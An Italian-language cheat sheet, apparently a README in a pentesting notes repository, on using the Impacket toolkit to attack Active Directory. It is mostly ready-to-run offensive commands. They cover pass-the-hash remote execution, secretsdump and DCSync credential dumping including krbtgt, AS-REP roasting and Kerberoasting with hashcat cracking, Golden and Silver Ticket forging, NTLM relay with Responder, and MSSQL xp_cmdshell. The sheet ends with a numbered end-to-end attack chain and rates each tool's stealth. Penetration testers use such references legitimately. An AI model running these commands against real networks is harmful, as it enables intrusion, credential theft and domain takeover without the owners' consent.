# 🐍 Impacket - Toolkit Python per gli attacchi ad AD

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md)

```
  ██╗███╗   ███╗██████╗  █████╗  ██████╗██╗  ██╗███████╗████████╗
  ██║████╗ ████║██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝
  ██║██╔████╔██║██████╔╝███████║██║     █████╔╝ █████╗     ██║   
  ██║██║╚██╔╝██║██╔═══╝ ██╔══██║██║     ██╔═██╗ ██╔══╝     ██║   
  ██║██║ ╚═╝ ██║██║     ██║  ██║╚██████╗██║  ██╗███████╗   ██║   
  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
              Toolkit Python per i protocolli di rete
```

<p align="center">
  <img src="https://img.shields.io/badge/Impacket-Active_Directory-red?style=for-the-badge" alt="Impacket">
  <img src="https://img.shields.io/badge/Python-blue?style=for-the-badge" alt="Python">
  <img src="https://img.shields.io/badge/Kerberos-green?style=for-the-badge" alt="Kerberos">
</p>

> **Nota sugli esempi:** nomi dei comandi e opzioni dipendono dal pacchetto e dalla versione. `-target-ip` seleziona l’indirizzo del bersaglio, non una condivisione; l’etichetta dell’originale è inesatta. Le operazioni richiedono privilegi e condizioni adatti: scrivere su una condivisione non equivale da solo a eseguire comandi. DCSync replica informazioni sulle credenziali, non è una copia completa di ogni dato di NTDS.dit. Le modalità Hashcat mostrate si riferiscono a specifici tipi di hash Kerberos, non a ogni cifratura. Le valutazioni di discrezione non garantiscono assenza di log. Vedi gli [esempi ufficiali Impacket](https://github.com/fortra/impacket/tree/master/examples).

---

## 📋 Indice

- [Che cos'è Impacket](#-che-cosè-impacket)
- [Installazione](#-installazione)
- [Esecuzione remota](#-esecuzione-remota)
- [Estrazione delle credenziali](#-estrazione-delle-credenziali)
- [Attacchi Kerberos](#-attacchi-kerberos)
- [Attacchi SMB](#-attacchi-smb)
- [Attacchi MSSQL](#-attacchi-mssql)
- [Query LDAP/AD](#-query-ldapad)
- [Riferimento rapido](#-riferimento-rapido)

---

## 🎯 Che cos'è Impacket

**Impacket** è una raccolta di classi Python per lavorare con i protocolli di rete. Offre strumenti importanti per i test di Active Directory (AD):

- 🎫 **Kerberos** - AS-REP roasting, Kerberoasting e attacchi ai ticket
- 💻 **Esecuzione remota** - psexec, wmiexec, smbexec, atexec
- 🔓 **Estrazione delle credenziali** - secretsdump, DCSync
- 📁 **SMB** - Operazioni sui file e inoltro dell'autenticazione (relay)
- 🗄️ **MSSQL** - Attacchi ai database

### Strumenti principali

| Strumento | Descrizione |
|------|-------------|
| **psexec.py** | Esecuzione remota tramite SMB |
| **wmiexec.py** | Esecuzione remota tramite WMI |
| **secretsdump.py** | Estrai credenziali e hash |
| **GetNPUsers.py** | AS-REP roasting |
| **GetUserSPNs.py** | Kerberoasting |
| **ntlmrelayx.py** | Attacchi di relay NTLM |
| **smbclient.py** | Client SMB |
| **mssqlclient.py** | Client MSSQL |

---

## 🚀 Installazione

### Kali Linux

```bash
# Preinstallato in Kali
impacket-psexec --help

# Oppure installa/aggiorna
pip3 install impacket
pip3 install impacket --upgrade
```

### Da GitHub

```bash
git clone https://github.com/fortra/impacket.git
cd impacket
pip3 install .

# Oppure installazione per lo sviluppo
pip3 install -e .
```

### Verifica

```bash
# Verifica l'installazione
impacket-psexec --help
python3 -c "import impacket; print(impacket.__version__)"
```

---

## 💻 Esecuzione remota

### psexec.py

```bash
# Con password
impacket-psexec domain.local/user:password@10.10.10.10

# Con hash NTLM (Pass-the-Hash)
impacket-psexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Amministratore locale
impacket-psexec administrator:password@10.10.10.10

# Esegui un comando
impacket-psexec domain.local/user:password@10.10.10.10 "whoami"

# Seleziona una condivisione specifica (etichetta dell'originale: vedi nota)
impacket-psexec domain.local/user:password@10.10.10.10 -target-ip 10.10.10.10
```

### wmiexec.py

```bash
# Meno evidente di psexec secondo l'originale
impacket-wmiexec domain.local/user:password@10.10.10.10

# Con hash
impacket-wmiexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Esegui un comando
impacket-wmiexec domain.local/user:password@10.10.10.10 "whoami"

# Senza output (modalità silenziosa)
impacket-wmiexec domain.local/user:password@10.10.10.10 -nooutput "cmd /c calc.exe"
```

### smbexec.py

```bash
# Usa SMB per l'esecuzione
impacket-smbexec domain.local/user:password@10.10.10.10

# Con hash
impacket-smbexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Specifica la condivisione
impacket-smbexec domain.local/user:password@10.10.10.10 -share ADMIN$
```

### atexec.py

```bash
# Usa l'Utilità di pianificazione
impacket-atexec domain.local/user:password@10.10.10.10 "whoami"

# Con hash
impacket-atexec domain.local/user@10.10.10.10 -hashes :NTLMHASH "whoami"
```

### dcomexec.py

```bash
# Usa DCOM
impacket-dcomexec domain.local/user:password@10.10.10.10

# Oggetti DCOM differenti
impacket-dcomexec domain.local/user:password@10.10.10.10 -object MMC20
impacket-dcomexec domain.local/user:password@10.10.10.10 -object ShellWindows
impacket-dcomexec domain.local/user:password@10.10.10.10 -object ShellBrowserWindow
```

---

## 🔓 Estrazione delle credenziali

### secretsdump.py

```bash
# Estrai da un host remoto
impacket-secretsdump domain.local/user:password@10.10.10.10

# Estrai con hash (PtH)
impacket-secretsdump domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Estrai dal controller di dominio (DCSync)
impacket-secretsdump domain.local/admin:password@DC01.domain.local

# DCSync limitato a un utente specifico
impacket-secretsdump -just-dc-user krbtgt domain.local/admin:password@DC01.domain.local

# Solo hash NTLM (senza chiavi Kerberos)
impacket-secretsdump -just-dc-ntlm domain.local/admin:password@DC01.domain.local

# Salva l'output in un file
impacket-secretsdump domain.local/admin:password@10.10.10.10 -outputfile hashes
```

### Attacco DCSync

```bash
# DCSync completo (estrae l'intero database AD secondo l'originale)
impacket-secretsdump -just-dc domain.local/admin:password@DC01.domain.local

# DCSync di un utente specifico
impacket-secretsdump -just-dc-user Administrator domain.local/admin:password@DC01.domain.local

# DCSync di krbtgt (per un Golden Ticket)
impacket-secretsdump -just-dc-user krbtgt domain.local/admin:password@DC01.domain.local

# Formato di output: user:RID:LM:NTLM:::
```

### Da file locali

```bash
# Da NTDS.dit + SYSTEM
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# Da SAM + SYSTEM
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Da SECURITY + SYSTEM (segreti LSA)
impacket-secretsdump -security SECURITY -system SYSTEM LOCAL
```

---

## 🎫 Attacchi Kerberos

### AS-REP Roasting (GetNPUsers.py)

```bash
# Trova utenti senza preautenticazione
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass

# Con credenziali
impacket-GetNPUsers domain.local/user:password -request

# IP del controller di dominio specificato
impacket-GetNPUsers domain.local/user:password -dc-ip 10.10.10.10 -request

# Salva l'output in un file
impacket-GetNPUsers domain.local/user:password -request -outputfile asrep.txt

# Formato per hashcat
impacket-GetNPUsers domain.local/user:password -request -format hashcat

# Formato per john
impacket-GetNPUsers domain.local/user:password -request -format john
```

### Kerberoasting (GetUserSPNs.py)

```bash
# Trova utenti esposti al Kerberoasting
impacket-GetUserSPNs domain.local/user:password

# Richiedi ticket TGS
impacket-GetUserSPNs domain.local/user:password -request

# Salva l'output in un file
impacket-GetUserSPNs domain.local/user:password -request -outputfile kerberoast.txt

# IP del controller di dominio
impacket-GetUserSPNs domain.local/user:password -dc-ip 10.10.10.10 -request

# Con hash
impacket-GetUserSPNs domain.local/user -hashes :NTLMHASH -request
```

### Recupero delle password dagli hash Kerberos

```bash
# AS-REP (modalità hashcat 18200)
hashcat -m 18200 asrep.txt wordlist.txt

# TGS/Kerberoast (modalità hashcat 13100)
hashcat -m 13100 kerberoast.txt wordlist.txt

# Con john
john --wordlist=wordlist.txt asrep.txt
john --wordlist=wordlist.txt kerberoast.txt
```

### getTGT.py

```bash
# Richiedi un TGT con password
impacket-getTGT domain.local/user:password

# Richiedi un TGT con hash
impacket-getTGT domain.local/user -hashes :NTLMHASH

# Richiedi un TGT con chiave AES
impacket-getTGT domain.local/user -aesKey <AES256KEY>

# Salva in user.ccache
# Esporta per l'utilizzo:
export KRB5CCNAME=user.ccache
```

### ticketer.py (Golden/Silver Ticket)

```bash
# Golden Ticket
impacket-ticketer -nthash <KRBTGT_NTLM_HASH> -domain-sid S-1-5-21-... -domain domain.local Administrator

# Silver Ticket
impacket-ticketer -nthash <SERVICE_NTLM_HASH> -domain-sid S-1-5-21-... -domain domain.local -spn MSSQLSvc/target.domain.local:1433 Administrator

# Usa il ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec domain.local/Administrator@target.domain.local -k -no-pass
```

---

## 📁 Attacchi SMB

### smbclient.py

```bash
# Collegati alla condivisione
impacket-smbclient domain.local/user:password@10.10.10.10

# Elenca le condivisioni
# (all'interno di smbclient)
shares

# Collegati a una condivisione specifica
use SHARE_NAME

# Elenca i file
ls

# Scarica un file
get filename

# Carica un file
put localfile

# Esegui un comando
# (se hai accesso in scrittura a una condivisione)
```

### smbserver.py

```bash
# Avvia un server SMB (per l'esfiltrazione)
impacket-smbserver share /tmp/share

# Con autenticazione
impacket-smbserver share /tmp/share -username user -password pass

# Supporto SMB2
impacket-smbserver share /tmp/share -smb2support
```

### ntlmrelayx.py

```bash
# Relay di base
impacket-ntlmrelayx -tf targets.txt

# Relay verso SMB
impacket-ntlmrelayx -tf targets.txt -smb2support

# Esegui il relay e un comando
impacket-ntlmrelayx -tf targets.txt -c "whoami"

# Estrai il SAM tramite relay
impacket-ntlmrelayx -tf targets.txt -smb2support --sam

# Relay verso LDAP
impacket-ntlmrelayx -t ldap://DC01.domain.local

# Con Responder:
# 1. Modifica Responder.conf, imposta SMB = Off, HTTP = Off
# 2. Esegui: responder -I eth0
# 3. Esegui: impacket-ntlmrelayx -tf targets.txt -smb2support
```

---

## 🗄 Attacchi MSSQL

### mssqlclient.py

```bash
# Collegati con autenticazione Windows
impacket-mssqlclient domain.local/user:password@10.10.10.10 -windows-auth

# Collegati con autenticazione SQL
impacket-mssqlclient sa:password@10.10.10.10

# Con hash
impacket-mssqlclient domain.local/user@10.10.10.10 -hashes :NTLMHASH -windows-auth

# Collegati a un database specifico
impacket-mssqlclient domain.local/user:password@10.10.10.10 -windows-auth -db master
```

### Comandi MSSQL

```sql
-- Abilita xp_cmdshell
enable_xp_cmdshell

-- Esegui un comando
xp_cmdshell whoami

-- Query SQL
SELECT * FROM master.sys.databases

-- Leggi un file
SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents
```

---

## 📂 Query LDAP/AD

### GetADUsers.py

```bash
# Elenca tutti gli utenti
impacket-GetADUsers domain.local/user:password -all

# Controller di dominio specifico
impacket-GetADUsers domain.local/user:password -dc-ip 10.10.10.10 -all

# Con hash
impacket-GetADUsers domain.local/user -hashes :NTLMHASH -all
```

### lookupsid.py

```bash
# Enumera gli utenti provando intervalli di SID
impacket-lookupsid domain.local/user:password@10.10.10.10

# Specifica l'intervallo di SID
impacket-lookupsid domain.local/user:password@10.10.10.10 20000
```

### findDelegation.py

```bash
# Trova le impostazioni di delega
impacket-findDelegation domain.local/user:password -dc-ip 10.10.10.10
```

---

## 📊 Riferimento rapido

### Opzioni di autenticazione

| Opzione | Descrizione |
|--------|-------------|
| `user:password` | Autenticazione con password |
| `-hashes :NTLM` | Hash NTLM (Pass-the-Hash) |
| `-hashes LM:NTLM` | Hash LM:NTLM |
| `-aesKey KEY` | Chiave AES256 |
| `-k -no-pass` | Kerberos con ccache |

### Opzioni comuni

| Opzione | Descrizione |
|--------|-------------|
| `-dc-ip IP` | IP del controller di dominio |
| `-target-ip IP` | IP del bersaglio |
| `-debug` | Abilita l'output di debug |

### Riepilogo dell'esecuzione remota

| Strumento | Metodo | Discrezione |
|------|--------|---------|
| psexec.py | SMB + servizio | Bassa |
| wmiexec.py | WMI | Media |
| smbexec.py | SMB | Bassa |
| atexec.py | Utilità di pianificazione | Alta |
| dcomexec.py | DCOM | Media |

### Procedura di attacco

```bash
# 1. Enumera gli utenti (AS-REP Roast)
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass

# 2. Esegui il Kerberoasting
impacket-GetUserSPNs domain.local/user:password -request

# 3. Recupera le password dagli hash
hashcat -m 18200 asrep.txt rockyou.txt
hashcat -m 13100 kerberoast.txt rockyou.txt

# 4. PtH oppure uso della password
impacket-psexec domain.local/admin:password@10.10.10.10

# 5. Estrai le credenziali
impacket-secretsdump domain.local/admin:password@DC01

# 6. DCSync per tutti gli hash
impacket-secretsdump -just-dc domain.local/admin:password@DC01
```

---

## 📚 Risorse

- [Impacket GitHub](https://github.com/fortra/impacket)
- [Esempi Impacket](https://github.com/fortra/impacket/tree/master/examples)
- [Wiki](https://github.com/fortra/impacket/wiki)

### Schede correlate
- [BloodHound](../../BloodHound/translations/README.it.md)
- [Mimikatz](../../Mimikatz/translations/README.it.md)
- [Hashcat](../../Hashcat/translations/README.it.md)

---

<p align="center">
  <b>🐍 Padroneggia gli attacchi AD con Python!</b><br>
  <i>Impacket - Un toolkit essenziale per il pentester</i>
</p>
